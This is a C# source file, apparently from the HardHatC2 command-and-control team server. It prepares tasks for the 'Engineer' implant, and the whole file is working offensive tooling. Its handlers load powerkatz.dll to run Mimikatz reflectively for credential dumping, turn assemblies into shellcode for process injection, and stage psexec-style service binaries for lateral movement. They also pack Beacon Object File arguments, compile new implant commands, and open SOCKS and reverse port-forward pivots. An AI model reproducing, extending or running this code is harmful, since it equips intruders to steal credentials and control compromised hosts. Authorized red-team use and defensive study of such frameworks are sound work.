using ApiModels.Plugin_BaseClasses;
using ApiModels.Plugin_Interfaces;
using ApiModels.Shared;
using ApiModels.Shared.TaskResultTypes;
using Microsoft.AspNet.SignalR;
using Microsoft.AspNetCore.Http;
using System;
using System.Collections.Generic;
using System.ComponentModel.Composition;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using TeamServer.Models.Extras;
using TeamServer.Plugin_Interfaces;
using TeamServer.Plugin_Interfaces.Ext_Implants;
using TeamServer.Plugin_Management;
using TeamServer.Services;
using TeamServer.Services.Handle_Implants;
using TeamServer.Utilities;

namespace TeamServer.Plugin_BaseClasses
{
    [Export(typeof(ExtImplant_TaskPreProcess_Base))]
    [ExportMetadata("Name", "Default")]
    [ExportMetadata("Description", "Default pre processing for the Engineer Implant")]
    public class ExtImplant_TaskPreProcess_Base
    {

        public virtual bool DetermineIfTaskPreProc(ExtImplantTask_Base task)
        {
            return task.RequiresPreProc;
        }

        public virtual void PreProcessTask(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            if (task.Command.Equals("addcommand", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_addcommand(task);
            }
            else if (task.Command.Equals("addmodule", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_addmodule(task);
            }
            else if (task.Command.Equals("executeassembly", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_executeassembly(task);
            }
            else if (task.Command.Equals("execute_bof", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_execute_bof(task);
            }
            else if (task.Command.Equals("execute_pe", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_execute_pe(task);
            }
            else if (task.Command.Equals("inlineshellcode", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_inlineshellcode(task);
            }
            else if (task.Command.Equals("inlineAssembly", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_inlineAssembly(task);
            }
            else if (task.Command.Equals("inlinedll", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_inlinedll(task);
            }
            else if (task.Command.Equals("inject", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_inject(task, implant);
            }
            else if (task.Command.Equals("jump", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_jump(task, implant);
            }
            else if (task.Command.Equals("loadassembly", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_loadassembly(task);
            }
            else if (task.Command.Equals("mimikatz", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_mimikatz(task);
            }
            else if (task.Command.Equals("powershell_import", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_powershell_import(task);
            }
            else if (task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_rportforward(task, implant).Wait();
            }
            else if (task.Command.Equals("sleep", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_sleep(task, implant);
            }
            else if (task.Command.Equals("spawn", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_spawn(task, implant);
            }
            else if (task.Command.Equals("socks", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_socks(task, implant).Wait();
            }
            else if (task.Command.Equals("upload", StringComparison.CurrentCultureIgnoreCase))
            {
                PreProcess_upload(task, implant);
            }
            //else if (task.Command.Equals("vnc", StringComparison.CurrentCultureIgnoreCase))
            //{
            //    PreProcess_VNC(task);
            //}
            //else if (task.Command.Equals("HandleVNCClientInteraction", StringComparison.CurrentCultureIgnoreCase))
            //{
            //    PreProcess_VNCInteraction(task);
            //}

        }

        private void PreProcess_upload(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            task.Arguments.TryGetValue("/dest", out string dest);
            task.Arguments.TryGetValue("/file", out string filepath);
            filepath = filepath.TrimStart(' ');
            if (!task.Arguments.TryGetValue("/local", out string _))
            {
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                task.File = fileContent;
            }
            IOCFile _Pending = new IOCFile();
            _Pending.Name = Path.GetFileName(filepath);
            _Pending.UploadedPath = dest;
            _Pending.UploadedHost = implant.Metadata.Hostname;
            _Pending.ID = task.Id;
            _Pending.md5Hash = Hash.GetMD5HashFromFile(filepath);
            _Pending.Uploadtime = DateTime.UtcNow;
            IOCFile.PendingIOCFiles.Add(_Pending.ID, _Pending);
        }

        private async Task PreProcess_socks(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            if (!task.Arguments.TryGetValue("/port", out string port))
            {
                port = "1080";
            }
            port = port.TrimStart(' ');
            //check if any of the pivot proxies are already using the port
            if (PivotProxy.PivotProxyList.Any(x => x.BindPort == port))
            {
                await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server on {port} already exists", Status = "error" });
                LoggingService.EventLogger.Error("socks server on {port} already exists", port);
                return;
            }
            HttpmanagerController.Proxy.Add(port, new Socks4Proxy(bindPort: int.Parse(port))); // gives the user supplied value as the port to start the socks server on :) 
                                                                                               //HttpmanagerController.testProxy = new Socks4Proxy(bindPort: int.Parse(port));

            //call proxy.Start() but dont block execution 
            Task.Run(() => HttpmanagerController.Proxy[port].Start(implant));
            //Task.Run(() => HttpmanagerController.testProxy.Start(engineer));
            //Console.WriteLine("Socks proxy started on port " + port);
            await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server started on {port}", Status = "success" });
            LoggingService.EventLogger.Information("socks server started on teamserver port {port}", port);
            await HardHatHub.AddPivotProxy(new PivotProxy { EngineerId = implant.Metadata.Id, BindPort = port, FwdHost = implant.Metadata.Address, FwdPort = "*", pivotType = PivotProxy.PivotProxyType.SOCKS4a, pivotDirection = PivotProxy.ProxyDirection.Bind });
            //if /stop is in the arguments, stop the proxy
            if (task.Arguments.ContainsKey("/stop"))
            {
                HttpmanagerController.Proxy[port].Stop();
                await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"socks server on {port} stopped", Status = "info" });
                LoggingService.EventLogger.Warning("socks server stopped on teamserver port {port}", port);
            }
        }

        private void PreProcess_spawn(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            //split the arguments into two strings at the first space
            if (!task.Arguments.TryGetValue("/manager", out string manager))
            {
                manager = implant.Metadata.ManagerName;
            }
            manager = manager.TrimStart(' ');
            string arguments = "";

            // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
            string basepath = Helpers.GetBaseFolderLocation();
            string filepath = Directory.GetFiles(basepath + Helpers.PathingTraverseUpString, $"PostExEngineer_{manager}.exe").FirstOrDefault();

            var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
            //convert byte array into a base64 string
            task.File = shellcode;
        }

        private void PreProcess_sleep(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            task.Arguments.TryGetValue("/time", out string sleep);
            implant.Metadata.Sleep = int.Parse(sleep);
        }

        private async Task PreProcess_rportforward(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            task.Arguments.TryGetValue("/fwdport", out string fwdport);
            task.Arguments.TryGetValue("/fwdhost", out string fwdaddress);
            task.Arguments.TryGetValue("/bindport", out string bindPort);
            //make a new guid for this client to have a unique id
            string clientid = Guid.NewGuid().ToString();
            fwdaddress = fwdaddress.TrimStart(' ');
            fwdport = fwdport.TrimStart(' ');
            bindPort = bindPort.TrimStart(' ');
            task.Arguments.TryAdd("/client", clientid);
            await HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"rport forward tasked to start targeting {fwdaddress}:{fwdport}", Status = "success" });
            LoggingService.EventLogger.Information("reverse port forward set to target {fwdaddress}:{fwdport}", fwdaddress, fwdport);
            Task.Run(async () => (RPortForward.rPortStart(fwdaddress, int.Parse(fwdport), clientid, implant)));
            await HardHatHub.AddPivotProxy(new PivotProxy { EngineerId = implant.Metadata.Id, FwdHost = fwdaddress, FwdPort = fwdport, BindPort = bindPort, pivotType = PivotProxy.PivotProxyType.R_PORT_FWD, pivotDirection = PivotProxy.ProxyDirection.Reverse });

        }

        private void PreProcess_powershell_import(ExtImplantTask_Base task)
        {
            if (task.Arguments.TryGetValue("/local", out string _))
            {
                return;
            }
            task.Arguments.TryGetValue("/import", out string filepath);
            filepath = filepath.TrimStart(' ');
            var fileContent = System.IO.File.ReadAllBytes(filepath);
            task.File = fileContent;
        }

        private void PreProcess_mimikatz(ExtImplantTask_Base task)
        {
            string basepath = Helpers.GetBaseFolderLocation();
            string filepath = Directory.GetFiles(basepath + "Programs" + $"{Helpers.PlatPathSeperator}" + "Builtin" + $"{Helpers.PlatPathSeperator}", $"powerkatz.dll").FirstOrDefault();
            var fileContent = System.IO.File.ReadAllBytes(filepath);
            task.File = fileContent;

            task.Arguments.Add("/function", "powershell_reflective_mimikatz");
            //update command name to inlinedll
            task.Command = "inlinedll";
        }

        private void PreProcess_loadassembly(ExtImplantTask_Base task)
        {
            throw new NotImplementedException();
        }

        private void PreProcess_inlinedll(ExtImplantTask_Base task)
        {
            if (task.Arguments.TryGetValue("/local", out string _))
            {
                return;
            }
            task.Arguments.TryGetValue("/dll", out string dllpath);
            dllpath = dllpath.TrimStart(' ');
            var fileContent = System.IO.File.ReadAllBytes(dllpath);
            // Console.WriteLine($"got {fileContent.Length} dll bytes");
            task.File = fileContent;
        }

        private void PreProcess_jump(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            //split the arguments into two strings at the first space
            if (!task.Arguments.TryGetValue("/manager", out string manager))
            {
                manager = implant.Metadata.ManagerName;
            }
            manager = manager.TrimStart(' ');
            string arguments = "";

            // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
            string basepath = Helpers.GetBaseFolderLocation();
            string filepath = "";

            if (task.Arguments.TryGetValue("/method", out string method))
            {
                method = method.Trim();
                if (method.Equals("psexec", StringComparison.CurrentCultureIgnoreCase))
                {
                    filepath = basepath + ".." + $"{Helpers.PlatPathSeperator}" + $"PostExEngineer_{manager}_service.exe";
                }
                else
                {
                    filepath = basepath + ".." + $"{Helpers.PlatPathSeperator}" + $"PostExEngineer_{manager}.exe";
                }
            }
            else
            {
                filepath = basepath + ".." + $"{Helpers.PlatPathSeperator}" + $"PostExEngineer_{manager}.exe";
            }
            var fileContent = System.IO.File.ReadAllBytes(filepath);
            task.File = fileContent;
        }

        private void PreProcess_inject(ExtImplantTask_Base task, ExtImplant_Base implant)
        {
            //split the arguments into two strings at the first space
            if (!task.Arguments.TryGetValue("/manager", out string manager))
            {
                manager = implant.Metadata.ManagerName;
            }
            manager = manager.TrimStart(' ');
            string arguments = "";

            // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
            string basepath = Helpers.GetBaseFolderLocation();
            string filepath = Directory.GetFiles(basepath + ".." + $"{Helpers.PlatPathSeperator}", $"PostExEngineer_{manager}.exe").FirstOrDefault();

            var shellcode = Shellcode.AssemToShellcode(filepath, arguments);
            //convert byte array into a base64 string
            task.File = shellcode;
        }

        private void PreProcess_inlineAssembly(ExtImplantTask_Base task)
        {
            task.Arguments.TryGetValue("/file", out string filepath);
            if (task.Arguments.TryGetValue("/local", out string _))
            {
                return;
            }
            //if filepath is not a real file path then use the default programs folder 
            if (!File.Exists(filepath))
            {
                // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                string basepath = Helpers.GetBaseFolderLocation();
                filepath = basepath + "Programs" + Helpers.PlatPathSeperator + "Users" + Helpers.PlatPathSeperator + filepath;
            }

            filepath = filepath.TrimStart(' ');
            var fileContent = System.IO.File.ReadAllBytes(filepath);
            task.File = fileContent;
        }

        private void PreProcess_inlineshellcode(ExtImplantTask_Base task)
        {
            byte[] shellcode;
            task.Arguments.TryGetValue("/program", out string program);
            task.Arguments.TryGetValue("/args", out string arguments);
            //split the arguments into two strings at the first space
            if (task.Arguments.TryGetValue("/local", out string _))
            {
                //if local then the file name and shellcode came from the client 
                //need to extract the name of the file from the program string 
                string filename = Path.GetFileName(program);

                shellcode = Shellcode.AssemToShellcode(task.File, filename, arguments);
                task.File = shellcode;
            }
            else
            {
                shellcode = Shellcode.AssemToShellcode(program, arguments);
                task.File = shellcode;
            }
        }

        private void PreProcess_execute_pe(ExtImplantTask_Base task)
        {
            try
            {
                task.Arguments.TryGetValue("/file", out string filepath);
                if (task.Arguments.TryGetValue("/local", out string _))
                {
                    return;
                }
                //if filepath is not a real file path then use the default programs folder 
                if (!File.Exists(filepath))
                {
                    // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                    //this should be location/HardHatC2/Teamserver/
                    string basepath = Helpers.GetBaseFolderLocation();
                    filepath = basepath + "Programs" + Helpers.PlatPathSeperator + "Users" + Helpers.PlatPathSeperator + filepath;
                }
                filepath = filepath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                task.File = fileContent;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in bof packer: {ex.Message}");
                Console.WriteLine(ex.StackTrace);

            }
        }

        private void PreProcess_execute_bof(ExtImplantTask_Base task)
        {
            try
            {

                task.Arguments.TryGetValue("/file", out string filepath);
                if (task.Arguments.TryGetValue("/local", out string _))
                {
                    return;
                }
                //if filepath is not a real file path then use the default programs folder 
                if (!File.Exists(filepath))
                {
                    // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                    string basepath = Helpers.GetBaseFolderLocation();
                    filepath = basepath + "Programs" + Helpers.PlatPathSeperator + "Users" + Helpers.PlatPathSeperator + filepath;
                }

                filepath = filepath.TrimStart(' ');
                var fileContent = System.IO.File.ReadAllBytes(filepath);
                task.File = fileContent;

                //get the /bof_string argument
                task.Arguments.TryGetValue("/argtypes", out string bof_string);
                //get the /bof_arg argument
                task.Arguments.TryGetValue("/args", out string bof_arg);
                string hexString;
                List<object> argList = new List<object>();
                List<string> argTypeList = bof_string.Select(c => c.ToString()).ToList();
                List<string> bofArgList = bof_arg.Split(' ').ToList();
                for (int i = 0; i < bofArgList.Count; i++)
                {
                    string args = bofArgList[i];
                    var argType = argTypeList[i];
                    if (argType == "b")
                    {
                        //if this is the case then the arg is a byte array and we should convert it and add it to the argList 
                        //first we need to remove the brackets from the string
                        string arg = args.TrimStart('[');
                        arg = arg.TrimEnd(']');
                        //now we need to split the string on the commas
                        List<string> byteStringList = arg.Split(',').ToList();
                        //now we need to convert each string to a byte and add it to a byte array
                        byte[] byteArray = new byte[byteStringList.Count];
                        for (int j = 0; j < byteStringList.Count; j++)
                        {
                            byteArray[j] = Convert.ToByte(byteStringList[j]);
                        }
                        byte[] argValue = byteArray;
                        argList.Add(argValue);

                    }
                    else if (argType == "i")
                    {
                        //if this is the case then the arg is an int and we should convert it and add it to the argList
                        int argValue = Convert.ToInt32(args);
                        argList.Add(argValue);

                    }
                    else if (argType == "s")
                    {
                        //if this is the case then the arg is a short and we should add it to the argList
                        short argValue = Convert.ToInt16(args);
                        argList.Add(argValue);

                    }
                    else if (argType == "z")
                    {
                        // if this is the case then the arg is a string and we should add it to the argList
                        argList.Add(args);

                    }
                    else if (argType == "Z")
                    {
                        // if this is the case then the arg is a wide string and we should add it to the argList
                        argList.Add(args);
                    }
                }

                bool result = bof_pack.Bof_Pack(bof_string, argList, out hexString);
                if (result)
                {
                    task.Arguments.Add("/bof_hex", hexString);
                    Console.WriteLine($"Packing successful");
                    //Console.WriteLine($"Hex string: {hexString}");
                }
                else
                {
                    Console.WriteLine($"Packing failed");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in bof packer: {ex.Message}");
                Console.WriteLine(ex.StackTrace);

            }
        }

        private void PreProcess_executeassembly(ExtImplantTask_Base task)
        {
            try
            {
                //split the arguments into two strings at the first space
                task.Arguments.TryGetValue("/file", out string program);
                task.Arguments.TryGetValue("/args", out string arguments);
                if (task.Arguments.TryGetValue("/local", out string _))
                {
                    //if local then the file name and shellcode came from the client
                    //need to extract the name of the file from the program string
                    string filename = Path.GetFileName(program);
                    Shellcode.AssemToShellcode(task.File, filename, arguments);
                    return;
                }
                if (!File.Exists(program))
                {
                    // find the file in the base directory of the project named "engineer_{manager}" and save its filepath to a string
                    string basepath = Helpers.GetBaseFolderLocation();
                    program = basepath + "Programs" + Helpers.PlatPathSeperator + "Users" + Helpers.PlatPathSeperator + program;
                }
                var shellcode = Shellcode.AssemToShellcode(program, arguments);
                task.File = shellcode;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in pre proc executeassembly: {ex.Message}");
            }

        }

        private void PreProcess_addcommand(ExtImplantTask_Base task)
        {
            //this should be location/HardHatC2/Teamserver/
            string basepath = Helpers.GetBaseFolderLocation();
            string StoredCommandFolder = basepath + Helpers.PathingTraverseUpString + "Engineer" + Helpers.PlatPathSeperator + "Commands" + Helpers.PlatPathSeperator;

            task.Arguments.TryGetValue("/command", out string command);
            command = command.TrimStart(' ');
            //find the matching .cs file in the EngineerCommands folder
            EnumerationOptions options = new EnumerationOptions();
            options.MatchCasing = MatchCasing.CaseInsensitive;
            string filepath = Directory.GetFiles(StoredCommandFolder, $"{command}.cs", options).FirstOrDefault();
            //read the file content and make it into a EngineerCommand object
            var fileContent = System.IO.File.ReadAllText(filepath);
            //use the CompilerService to compile the file into a dll
            byte[] AssemblyBytes = Compile.CompileCommands(fileContent);

            task.File = AssemblyBytes;
        }

        private void PreProcess_addmodule(ExtImplantTask_Base task)
        {
            try
            {
                //this should be location/HardHatC2/Teamserver/
                string basepath = Helpers.GetBaseFolderLocation();
                string StoredModuleFolder = basepath + Helpers.PathingTraverseUpString + "Engineer" + Helpers.PlatPathSeperator + "Modules" + Helpers.PlatPathSeperator;

                task.Arguments.TryGetValue("/module", out string module);
                module = module.Trim();
                //find the matching .cs file in the EngineerCommands folder
                EnumerationOptions options = new EnumerationOptions();
                options.MatchCasing = MatchCasing.CaseInsensitive;
                string filepath = Directory.GetFiles(StoredModuleFolder, $"{module}.cs", options).FirstOrDefault();
                //read the file content and make it into a EngineerCommand object
                var fileContent = System.IO.File.ReadAllText(filepath);
                //use the CompilerService to compile the file into a dll
                byte[] AssemblyBytes = Compile.CompileCommands(fileContent);

                task.File = AssemblyBytes;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error adding module: {ex.Message}");
            }
        }

        //private void PreProcess_VNC(ExtImplantTask_Base task)
        //{
        //    try
        //    {
        //        if (task.Arguments.TryGetValue("/operation", out string op))
        //        {
        //            if (op.Trim().Equals("start", StringComparison.CurrentCultureIgnoreCase))
        //            {
        //                var newVncMetadata = new VNCSessionMetadata();
        //                newVncMetadata.SessionID = task.Id;
        //                newVncMetadata.FilterInput = true;
        //                newVncMetadata.startingUser = task.IssuingUser;
        //                newVncMetadata.LastHeartbeatRequest = DateTime.UtcNow;

        //                VNC_Util.InitOrUpdateSession(newVncMetadata, new VncInteractionResponse());
        //                Console.WriteLine("VNC server requested to start");
        //            }
        //            else if (op.Trim().Equals("stop", StringComparison.CurrentCultureIgnoreCase))
        //            {
        //                Console.WriteLine("VNC server requested to stop");
        //            }
        //            else
        //            {
        //                Console.WriteLine($"vnc operation of {op} is not recognized");
        //            }
        //        }
        //        else
        //        {
        //            Console.WriteLine("VNC operation not found");
        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine($"Error in pre proc VNC: {ex.Message}");
        //    }
        //}

        //private void PreProcess_VNCInteraction(ExtImplantTask_Base task)
        //{
        //    try
        //    {
        //        string sessionID = task.Arguments["/sessionid"];
        //        var vncMetadata = VNC_Util.ImplantVNCSessionMeta.FirstOrDefault(x => x.Key == sessionID);
        //        vncMetadata.Value.LastHeartbeatRequest = DateTime.UtcNow;
        //        task.Arguments.TryGetValue("/interactionEvent", out string interactEventstring);
        //        if (interactEventstring != VncInteractionEvent.View.ToString())
        //        {
        //            vncMetadata.Value.LastInteraction = DateTime.UtcNow;
        //        }
        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine($"Error in pre proc VNC interation: {ex.Message}");
        //    }
        //}
    }

    public interface IExtImplant_TaskPreProcessData : IPluginMetadata
    {
    }
}
